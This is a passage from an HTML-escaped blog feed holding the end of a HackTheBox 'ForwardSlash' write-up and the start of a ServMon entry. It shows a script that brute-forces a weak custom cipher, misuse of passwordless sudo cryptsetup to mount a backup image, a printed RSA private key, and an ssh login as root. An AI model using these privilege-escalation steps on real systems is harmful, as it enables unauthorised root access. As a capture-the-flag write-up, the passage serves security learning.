+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;char_key&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;reversed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;reversed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;))):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The key can quickly be brute force with a quick script including the &lt;code&gt;decrypt&lt;/code&gt;
+function and looking for some "classic" English words in the decrypted text.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;char_key&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;reversed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;reversed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;))):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;ciphertext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ciphertext&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;165&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;127&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;the &amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;be &amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;and &amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;of &amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Key: &lt;/span&gt;&lt;span class="si"&gt;{0}&lt;/span&gt;&lt;span class="s2"&gt;, Key length: &lt;/span&gt;&lt;span class="si"&gt;{1}&lt;/span&gt;&lt;span class="s2"&gt;, Msg: &lt;/span&gt;&lt;span class="si"&gt;{2}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Running the script give the following result:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python2 decode.py&lt;/span&gt;
+&lt;span class="code-line"&gt;Key: ttttttttttttttttt, Key length: 17, Msg: Hlô¿vFÞ;©¨ºÒÀî&amp;amp;you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;em&gt;Note: there seems to be some flow in the encryption as every key starting with
+&lt;code&gt;t&lt;/code&gt; and 17 characters long will decrypt the message. I modified the script to
+use a fixed key:&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python2 decode.py&lt;/span&gt;
+&lt;span class="code-line"&gt;Key: t2345678901234567, Key length: 17, Msg: HdD.ÛÄçáp޺¿éyou liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We look at our &lt;code&gt;sudo&lt;/code&gt; permission. We can run a few commands as root without
+password mostly &lt;code&gt;/sbin/cryptsetup luksOpen&lt;/code&gt; that allow to open a LUKS encrypted
+image.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pain@forwardslash:~$ sudo -l&lt;/span&gt;
+&lt;span class="code-line"&gt;Matching Defaults entries for pain on forwardslash:&lt;/span&gt;
+&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User pain may run the following commands on forwardslash:&lt;/span&gt;
+&lt;span class="code-line"&gt;    (root) NOPASSWD: /sbin/cryptsetup luksOpen *&lt;/span&gt;
+&lt;span class="code-line"&gt;    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/&lt;/span&gt;
+&lt;span class="code-line"&gt;    (root) NOPASSWD: /bin/umount ./mnt/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;With the passphrase and our &lt;code&gt;sudo&lt;/code&gt; permission we can easily open the
+&lt;code&gt;encrypted_backup.img&lt;/code&gt; image which contain a RSA private key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pain@forwardslash:/tmp/plop$ mkdir mnt&lt;/span&gt;
+&lt;span class="code-line"&gt;pain@forwardslash:/tmp/plop$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter passphrase for /var/backups/recovery/encrypted_backup.img:&lt;/span&gt;
+&lt;span class="code-line"&gt;pain@forwardslash:/tmp/plop$ sudo /bin/mount /dev/mapper/backup ./mnt/&lt;/span&gt;
+&lt;span class="code-line"&gt;pain@forwardslash:/tmp/plop$ ls mnt/&lt;/span&gt;
+&lt;span class="code-line"&gt;id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;pain@forwardslash:/tmp/plop$ cat mnt/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK&lt;/span&gt;
+&lt;span class="code-line"&gt;RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf&lt;/span&gt;
+&lt;span class="code-line"&gt;yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc&lt;/span&gt;
+&lt;span class="code-line"&gt;u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu&lt;/span&gt;
+&lt;span class="code-line"&gt;NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9&lt;/span&gt;
+&lt;span class="code-line"&gt;MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa&lt;/span&gt;
+&lt;span class="code-line"&gt;V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg&lt;/span&gt;
+&lt;span class="code-line"&gt;G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO&lt;/span&gt;
+&lt;span class="code-line"&gt;3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC&lt;/span&gt;
+&lt;span class="code-line"&gt;vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p&lt;/span&gt;
+&lt;span class="code-line"&gt;MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD&lt;/span&gt;
+&lt;span class="code-line"&gt;Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn&lt;/span&gt;
+&lt;span class="code-line"&gt;5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs&lt;/span&gt;
+&lt;span class="code-line"&gt;V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg&lt;/span&gt;
+&lt;span class="code-line"&gt;e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8&lt;/span&gt;
+&lt;span class="code-line"&gt;6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh&lt;/span&gt;
+&lt;span class="code-line"&gt;i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq&lt;/span&gt;
+&lt;span class="code-line"&gt;tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW&lt;/span&gt;
+&lt;span class="code-line"&gt;woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi&lt;/span&gt;
+&lt;span class="code-line"&gt;/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA&lt;/span&gt;
+&lt;span class="code-line"&gt;1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW&lt;/span&gt;
+&lt;span class="code-line"&gt;J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr&lt;/span&gt;
+&lt;span class="code-line"&gt;OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw&lt;/span&gt;
+&lt;span class="code-line"&gt;ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo&lt;/span&gt;
+&lt;span class="code-line"&gt;ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o&lt;/span&gt;
+&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;With the private key we can directly connect as &lt;code&gt;root&lt;/code&gt; to the local machine and get
+the &lt;code&gt;root.txt&lt;/code&gt; flag:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pain@forwardslash:/tmp/plop$ ssh root@localhost -i mnt/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;root@forwardslash:~# cat root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;419f9c340fcc83acccfcbebfe17d2538&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This box was hard. I don't usually do the hard box as they take so much time.
+This one was long and I ask a few questions on the discord channel to avoid
+taking too much time on rabbit hole. Nevertheless the box feels good.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="openAdmin"></category><category term="Linux"></category></entry><entry><title>HTB: ServMon</title><link href="https://maggick.fr/2020/06/htb-servmon.html" rel="alternate"></link><published>2020-06-21T09:15:00+02:00</published><updated>2020-06-21T09:15:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-06-21:/2020/06/htb-servmon.html</id><summary type="html">&lt;p&gt;&lt;img alt="ServMon Card" class="align-left" src="/media/2020.06/servmon_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This article is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/240"&gt;ServMon&lt;/a&gt; publish on April
